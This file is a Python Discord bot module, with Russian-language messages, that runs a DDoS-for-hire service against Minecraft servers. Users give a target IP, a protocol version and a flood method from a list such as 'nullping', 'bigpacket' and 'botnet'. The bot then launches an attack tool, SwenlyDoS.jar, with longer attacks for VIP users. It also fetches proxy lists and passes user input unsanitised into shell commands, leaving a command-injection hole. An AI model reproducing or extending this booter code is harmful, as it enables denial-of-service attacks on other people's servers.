import discord
from discord.ext import commands
import yaml
import codecs
import os
import asyncio
import sqlite3
import psutil
import datetime
from mcstatus import MinecraftServer
from discord import utils
from discord.utils import get
from psutil import Process, virtual_memory
import threading
import requests
import urllib.request
import json
from config import settings
from random import choice

errors = settings['errors']
methods_list = ['botjoiner', 'join', 'legitjoin', 'localhost', 'invalidnames', 'longnames', 'spoof', 'ping', 'nullping', 'multikeller', 'handshake', 'bighandshake', 'bigpacket', 'network', 'randombytes', 'extremejoin', 'spamjoin', 'nettydowner', 'ram', 'yoonikscry', 'colorcrasher', 'tcphit', 'queur', 'botnet', 'tcpbypass', 'ultimatesmasher', 'sf', 'nabcry', 'charonbot']
protocols_list = ['758', '757', '757', '756', '754', '753', '751', '736', '735', '578', '575', '573', '498', '490', '485', '480', '477', '404', '401', '393', '340', '338', '335']
versions_list = ['1.8:47', '1.8.8:47', '1.8.9:47', '1.12:335', '1.12.1:338', '1.12.2:340', '1.13:393', '1.13.1:401', '1.13.2:404', '1.14:477', '1.14.1:480', '1.14.2:485', '1.14.3:490', '1.14.4:498', '1.15:573', '1.15.1:575', '1.15.2:578', '1.16:735', '1.16.1:736', '1.16.2:751', '1.16.3:753', '1.16.4:754', '1.16.5:754', '1.17:755', '1.17.1:756', '1.18:757', '1.18.1:757', '1.18.2:758']
attack_list = []
free_channel = 1030861718382972948
vip_channel = 1031167896405151834

class Minecraft(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
    
    #? Ошибки
    if errors == True:
        @commands.Cog.listener()
        async def on_command_error(self, ctx, error):
            lol = 0
            emb = discord.Embed(
                colour=discord.Color.red()
            )
            if str(error).startswith('Command raised an exception: HTTPError: HTTP Error 429: Too Many Requests') or str(error) == 'Command raised an exception: HTTPError: HTTP Error 429: Too Many Requests':
                await ctx.send('Бля ошибка! Я хз почему, прост забей на этот серв нахуй!')
                lol = 1
            if isinstance(error, commands.CommandNotFound) and lol != 1:
                emb.add_field(name="Ошибка!", value=f"""Этой команды не существует!\nЕсли ты хочешь узнать команды сервера напиши {ctx.prefix}help""", inline = False)
                lol = 1
            if isinstance(error, commands.MissingPermissions) and lol != 1:
                emb.add_field(name = "Ошибка!", value=f"""У вас недостаточно прав! Вы феминистка?""", inline = False)
                lol = 1
            if isinstance(error, commands.CommandOnCooldown) and lol != 1:
                emb.add_field(name = "Ошибка!", value=f"""Не так быстро дружочек!\nНа эту команду стоит задержка!""", inline = False)
                retry_after = str(error.retry_after).split(".")
                if str(error.cooldown).split("per: ")[1].startswith('59.12'): None
                if int(retry_after[0]) == 0 or int(retry_after[0]) > 4: emb.add_field(name = 'Осталось', value = f'{retry_after[0]} секунд', inline = False)
                elif int(retry_after[0]) == 1: emb.add_field(name = 'Осталось', value = f'{retry_after[0]} секунда', inline = False)
                else: emb.add_field(name = 'Осталось', value = f'{retry_after[0]} секунды', inline = False)
                print(error.cooldown)
                lol = 1
            if isinstance(error, commands.MissingRequiredArgument) and lol != 1:
                emb.add_field(name = "Ошибка!", value=f"Недостаточно аргументов!", inline = False)
                if str(error.param) == 'ip' or str(error.param) == 'version' or str(error.param) == 'methods' or str(error.param) == 'time: int' or str(error.param) == 'cps: int':
                    emb.add_field(name = "Использоввание", value = '$attack <айпи> <версия> <метод> <время>')
                    await ctx.send('Важно! ДДос работает исключительно в дс сервере https://dsc.gg/swenly', embed=emb)
                    return
                emb.add_field(name = 'Необходимый параметр', value = f'{error.param}', inline = False)
                lol = 1
            if isinstance(error, commands.MemberNotFound) and lol != 1:
                emb.add_field(name = "Ошибка!", value=f"Участник не найден!", inline = False)
                lol = 1
            if isinstance(error, commands.ChannelNotFound) and lol != 1:
                emb.add_field(name = "Ошибка!", value=f"В аргументе должен быть текстовый канал", inline = False)
                lol = 1
            if isinstance(error, commands.BadArgument) and lol != 1:
                emb.add_field(name = "Ошибка!", value=f"Неправильно передан аргумент!", inline = False)
                lol = 1
            if lol == 0:
                print(error)
                if error != '' and error != None and error != '\n':
                    emb.add_field(name = "Ошибка!", value=error, inline = False)
                else:
                    emb.add_field(name = "Ошибка!", value='Я хз чо за ошибо4ка!', inline = False)
            await ctx.send(embed=emb)

    #@commands.command()
    #@commands.cooldown(1, 2, commands.BucketType.user)
    #async def stop(self, ctx):
    #    if ctx.message.author.id == owner_id:
    #        await ctx.send('Успшено!')
    #        PROCNAME = "java.exe"
    #        for proc in psutil.process_iter():
    #            if proc.name() == PROCNAME:
    #                proc.kill()

    @commands.command()
    @commands.cooldown(1, 5, commands.BucketType.user)
    async def stop(self, ctx):
        if ctx.message.author.id != self.bot.owner_id: return
        os.system("pkill 'java'")
        embed = discord.Embed(
            title='Атака завершена!',
            description=f'{ctx.author.mention} стопнул все атаки нахуй, уебите его!',
            color=discord.Colour.red()
        )

        await ctx.send(embed=embed)
    
    @commands.command()
    async def stats(self, ctx):
        memoryused = round(psutil.virtual_memory().used / 1, 2)
        memory = f"{memoryused}GB"
        bedem = discord.Embed(title = 'Стата топ ВДСки', description = '')
        bedem.add_field(name = 'CPU Usage', value = f'{psutil.cpu_percent()}%', inline = False)
        bedem.add_field(name="RAM Usage:", value=memory)
        bedem.add_field(name = 'Memory Usage', value = f'{psutil.virtual_memory().percent}%', inline = False)
        bedem.add_field(name = 'Available Memory', value = f'{psutil.virtual_memory().available * 100000 / psutil.virtual_memory().total}%', inline = False)
        await ctx.send(embed = bedem)
    
    @commands.command()
    @commands.cooldown(1, 120, commands.BucketType.user)
    async def proxy(self, ctx):
        def update():
            os.system('wget https://api.openproxylist.xyz/socks4.txt')
            os.system('mv socks4.txt proxies.txt')
    
        t1 = threading.Thread(target=update)
    
        t1.start()
    
        await ctx.send("Proxy Updated")
    
    
    #@commands.command()
    #@commands.cooldown(1, 1, commands.BucketType.user)
    #async def help(self, ctx):
    #    embed = discord.Embed(
    #        title="Attack Hub",
    #        color=discord.Colour.random()
    #    )
    #    embed.add_field(name='**Attack**', value='$attack <ip:port> <protocol> <method> <time> <cps>', inline=False)
    #    embed.add_field(name='**Methods**', value='$methods', inline=False)
    #    embed.add_field(name='**Protocols**', value='$versions', inline=False)
    #    embed.add_field(name='**Resolver**', value='$resolve <domain>', inline=False)
    #    embed.add_field(name='**Stop Attack**', value='$stop', inline=False)
    #    embed.add_field(name='**Stats**', value='$stats', inline=False)
    #    embed.add_field(name='**Proxy Upd**', value='$proxy', inline=False)
    #    embed.set_footer(text="dev by iva#0001")
    #    await ctx.send(embed=embed)
    
    # Статус сервера
    @commands.command(aliases = ['resolve', 'сервер_статус', 'сервер-статус', 'сервер_статс', 'сервер-статс', 'server-stats', 'server-status', 'server_status'])
    @commands.cooldown(1, 5, commands.BucketType.user)
    async def server_stats(self, ctx, adress: str):
        if errors == True:
            try:
                url = "https://api.mcsrvstat.us/2/" + adress
                file = urllib.request.urlopen(url)

                for line in file:
                    decoded_line = line.decode("utf-8")

                json_object = json.loads(decoded_line)
                try: server = MinecraftServer.lookup(adress)
                except: server = MinecraftServer.lookup(f'{adress}:25565')
                status = server.status()
                
                emb = discord.Embed(title = f'Статистика сервера', color = discord.Color.blue())
                try:
                    try: emb.add_field(name = 'Айпи', value = f"{json_object['ip']}:{json_object['port']}", inline=False)
                    except: emb.add_field(name = 'Айпи', value = json_object['ip'], inline=False)
                except: None
                emb.add_field(name = 'Онлайн сервера', value = f'{status.players.online}/{status.players.max}', inline = False)
                try: emb.add_field(name = 'Хост', value = json_object['hostname'], inline=False)
                except: None
                try:
                    if status.latency != '' and status.latency != None:
                        try: emb.add_field(name = 'Пинг', value = f"{str(status.latency).split('.')[0]}", inline = False)
                        except: emb.add_field(name = 'Пинг', value = f"{str(status.latency)}", inline = False)
                except: None
                emb.add_field(name = 'Версия сервера', value = f'{status.version.name}', inline = False)
                try: g = adress.split(':')[0]
                except: g = adress
                try: gb = adress.split(':')[1]
                except: gb = 25565

                emb.set_image(url=f'http://status.mclive.eu/storm/{g}/{gb}/banner.png')
            except Exception as e:
                print(e)
                emb = discord.Embed(color = discord.Color.red())
                emb.add_field(name = 'Ошибка!', value = 'Сервер выключен либо его не существует')
        else:
            url = "https://api.mcsrvstat.us/2/" + adress
            file = urllib.request.urlopen(url)

            for line in file:
                decoded_line = line.decode("utf-8")

            json_object = json.loads(decoded_line)
            try: server = MinecraftServer.lookup(adress)
            except: server = MinecraftServer.lookup(f'{adress}:25565')
            status = server.status()
            emb = discord.Embed(title = f'Статистика сервера', color = discord.Color.blue())
            emb.add_field(name = 'Айпи', value = json_object['ip'], inline=False)
            emb.add_field(name = 'Онлайн сервера', value = f'{status.players.online}/{status.players.max}', inline = False)
            try: emb.add_field(name = 'Хост', value = json_object['hostname'], inline=False)
            except: None
            try:
                if status.latency != '' and status.latency != None:
                    try: emb.add_field(name = 'Пинг', value = f"{str(status.latency).split('.')[0]}", inline = False)
                    except: emb.add_field(name = 'Пинг', value = f"{str(status.latency)}", inline = False)
            except: None
            emb.add_field(name = 'Версия сервера', value = f'{status.version.name}', inline = False)
            try: g = adress.split(':')[0]
            except: g = adress
            try: gb = adress.split(':')[1]
            except: gb = 25565
            emb.set_image(url=f'http://status.mclive.eu/storm/{g}/{gb}/banner.png')
        await ctx.send(embed=emb)
    
    @commands.command()
    @commands.cooldown(1, 1, commands.BucketType.user)
    async def methods(self, ctx):
        embed = discord.Embed(
            title="All Methods",
            color=discord.Colour.green()
        )
        embed.add_field(name='Methods:', value=', '.join([i for i in methods_list]), inline=False)
        await ctx.send(embed=embed)    

    @commands.command(aliases = ['add_vip', 'добавить_вип', 'вип_добавить', 'add-vip', 'добавить-вип', 'вип-добавить'])
    @commands.cooldown(1, 1, commands.BucketType.user)
    async def vip_add(self, ctx, member: discord.Member):
        if ctx.message.author.id != self.bot.owner_id: return
        vips = open('db/vips.txt', 'r')
        vips_read = vips.read()
        if str(member.id) in vips_read: await ctx.send('Не удалось!'); return
        vips.close()
        with open('db/vips.txt', 'a') as vips:
            if vips_read == [''] or vips_read == [] or vips_read == '':
                vips.write(f'{member.id}')
            else:
                vips.write(f'\n{member.id}')
        await ctx.send('Успешно!')

    @commands.command(aliases = ['remove_vip', 'удалить_вип', 'вип_удалить', 'remove-vip', 'удалить-вип', 'вип-удалить', 'del-vip', 'vip-del', 'del_vip', 'vip_del'])
    @commands.cooldown(1, 1, commands.BucketType.user)
    async def vip_remove(self, ctx, member: discord.Member):
        if ctx.message.author.id != self.bot.owner_id: return
        vips = open('db/vips.txt', 'r')
        vips_read = vips.read()
        if str(member.id) not in vips_read: await ctx.send('Не удалось!'); return
        vips.close()
        with open('db/vips.txt', 'w') as vips:
            try: vips_read.remove(f'\n{member.id}')
            except:
                try: vips_read.remove(f'{member.id}\n')
                except: await ctx.send('Не удалось!'); return
            for line in vips:
                vips.writelines(line)
        
        await ctx.send('Успешно!')

    @commands.command(aliases = ['випы'])
    @commands.cooldown(1, 1, commands.BucketType.user)
    async def vips(self, ctx):
        file = open('db/vips.txt', 'r')
        vips = file.read()
        vips_lines = file.readlines()
        file.close()
        list = []
        for vip in vips.split('\n'):
            list.append(f'{ctx.guild.get_member(int(vip))}')
        await ctx.send(f'\n'.join([vip for vip in list]))

    @commands.command()
    @commands.cooldown(1, 1, commands.BucketType.user)
    async def whitelist_add(self, ctx, ip):
        if ctx.message.author.id != self.bot.owner_id: return
        file = open('db/whitelist.txt', 'r')
        ips = file.read()
        file.close()

        with open('db/whitelist.txt', 'a') as file:
            if ips == [''] or ips == [] or ips == '':
                file.write(f'{ip}')
            else:
                file.write(f'\n{ip}')
        
        await ctx.send('Успешно! Этот айпи добавлен в белый список!')
    
    @commands.command(aliases = ['whitelist_del'])
    @commands.cooldown(1, 1, commands.BucketType.user)
    async def whitelist_remove(self, ctx, ip):
        if ctx.message.author.id != self.bot.owner_id: return
        file = open('db/whitelist.txt', 'r')
        ips = file.read()
        if ip not in ips: await ctx.send('Этого айпи нет в ватлисте!'); return
        file.close()

        with open('db/whitelist.txt', 'w') as file:
            if ips == [''] or ips == [] or ips == '':
                file.write(f'{ip}')
            else:
                try: ips.remove(f'\n{ip}')
                except:
                    try: ips.remove(f'{ip}\n')
                    except: await ctx.send('Нихуя не получилось!')
        
        await ctx.send('Успешно! Айпи удален из белого списка!')

    @commands.command(aliases = ['вайтлист'])
    @commands.cooldown(1, 120, commands.BucketType.guild)
    async def whitelist(self, ctx):
        file = open('db/whitelist.txt', 'r')
        ips = file.read()
        file.close()

        await ctx.send(f'\n'.join([ip for ip in ips.split('\n')]))

    @commands.command(aliases = ['versions'])
    @commands.cooldown(1, 1, commands.BucketType.user)
    async def protocols(self, ctx):
        embed = discord.Embed(
            title="Versions : Protocols",
            color=discord.Colour.blue()
        )
        embed.add_field(name = '1.18 1.18.1 1.18.2', value = '757 757 758', inline=False)
        embed.add_field(name="1.17 1.17.1", value="755 756 757", inline=False)
        embed.add_field(name="1.16 1.16.1 1.16.5", value="735 736 754", inline=False)
        embed.add_field(name="1.15 1.15.2", value="573 758 757", inline=False)
        embed.add_field(name="1.14 1.14.4", value="477 485", inline=False)
        embed.add_field(name="1.12 1.12.2 1.13.2", value="335 340 404", inline=False)

        await ctx.send(embed=embed)

    @commands.command()
    @commands.cooldown(1, 120, commands.BucketType.user)
    async def attack(self, ctx, ip, version, method):
        cps = -1
        ip = ip.lower()
        try: server = MinecraftServer.lookup(ip)
        except:
            try: server = MinecraftServer.lookup(f'{ip}:25565')
            except:
                em = discord.Embed(color=discord.Color.red())
                em.add_field(name=f"Ошибка", value=f"Сервер выключен!", inline=False)
                await ctx.send(embed=em)
                return
        try: status = server.status()
        except:
            em = discord.Embed(color=discord.Color.red())
            em.add_field(name=f"Ошибка", value=f"Сервер выключен!", inline=False)
            await ctx.send(embed=em)
            return
        
        file = open('db/whitelist.txt', 'r')
        ips = file.read()
        file.close()
        vip_file = open('db/vips.txt', 'r')
        vips = vip_file.read()
        vip_file.close()
            
        for line in ips.split('\n'):
            if line == '' or line == None: continue
            if line in ip or ip in line: await ctx.send('Этот айпи находится в белом списке!'); return

        if method not in methods_list:
            em = discord.Embed(color=discord.Color.red())
            em.add_field(name=f"Ошибка", value=f"Неправильный метод!", inline=False)
            await ctx.send(embed=em)
            return
        
        if ctx.message.channel.id != free_channel and ctx.message.channel.id != vip_channel:
            em = discord.Embed(color=discord.Color.red())
            em.add_field(name=f"Ошибка", value=f"Не тот канал!", inline=False)
            await ctx.send(embed=em)
            return

        if str(ctx.message.author.id) in vips:
            time = 120

        else:
            time = 60

        embed = discord.Embed(
            title='⚡️ ВЫЕБИ СЕРВЕРА!!! ⚡️',
            description=f'Атаку запустил {ctx.author.mention}',
            color=discord.Colour.blue()
        )


        def attack():
            if str(ctx.message.author.id) in vips:
                os.system(
                    f'java -Xmx8g -server -jar SwenlyDoS.jar {ip} {version} {method} {time} {cps}')
                os.system(f"")
            else:
                os.system(
                    f'java -Xmx6g -server -jar SwenlyDoS.jar {ip} {version} {method} {time} {cps}')
                os.system(f"")
        for i in versions_list:
            if str(version) == i.split(':')[1]: version = i.split(':')[0]
        embed.add_field(name='┌🚀 TARGET:', value=f'{ip}', inline=False)
        embed.add_field(name='│📜 PROTOCOLS:', value=f'{version}', inline=False)
        embed.add_field(name='│⚙️ METHOD:', value=f'{method}', inline=False)
        embed.add_field(name='└🕧 TIME:', value=f'{time}', inline=False)
        gifs = ['https://media.tenor.com/by-m8xaKZUcAAAAC/caveman.gif', 'https://c.tenor.com/AaSAnseLFLMAAAAd/sus.gif']
        embed.set_image(url=f'{gifs[0]}')
        embed.set_footer(text="CREATE BY 𝐃𝐞𝐲𝐦𝐨𝐧 🌈™#7777")

        lol = 0
        for i in versions_list:
            if str(version) == i.split(':')[1]: lol = 1; break
            if str(version) == i.split(":")[0]: version = i.split(":")[1]; lol = 1; break
        
        if lol == 0:
            em = discord.Embed(title=f"Ошибка", description=f"Неправильная версия или протокол!", color=discord.Color.red())
            await ctx.send(embed=em)
            return

        #if json_object["online"] == False:
        #    emb = discord.Embed(color = discord.Color.red())
        #    emb.add_field(name = 'Ошибка!', value = 'Сервер выключен либо его не существует')
        #    await ctx.send(embed=emb)
        #    return
        lol = 0
        for i in versions_list:
            if str(version) == i.split(':')[1]: lol = 1; break
            if str(version) == i.split(":")[0]: version = i.split(":")[1]; lol = 1; break
        embed.timestamp = datetime.datetime.utcnow()
        await ctx.send(embed=embed)

        attack_list.append(f'{ip}&&{version}&&{method}&&{time}&&{cps}&&{ctx.message.author.id}')

        def attackList(args):
            arguments = args.split('&&')
            if str(arguments[5]) in vips:
                os.system(
                    f'java -Xmx8g -server -jar SwenlyDoS.jar {arguments[0]} {arguments[1]} {arguments[2]} {arguments[3]} {arguments[4]}')
                os.system(f"")
            else:
                os.system(
                    f'java -Xmx6g -server -jar SwenlyDoS.jar {arguments[0]} {arguments[1]} {arguments[2]} {arguments[3]} {arguments[4]}')
                os.system(f"")

        
        t1 = threading.Thread(target=attackList(attack_list[0]))
        t1.start()
        attack_list.remove(attack_list[0])

def setup(bot):
    bot.add_cog(Minecraft(bot))
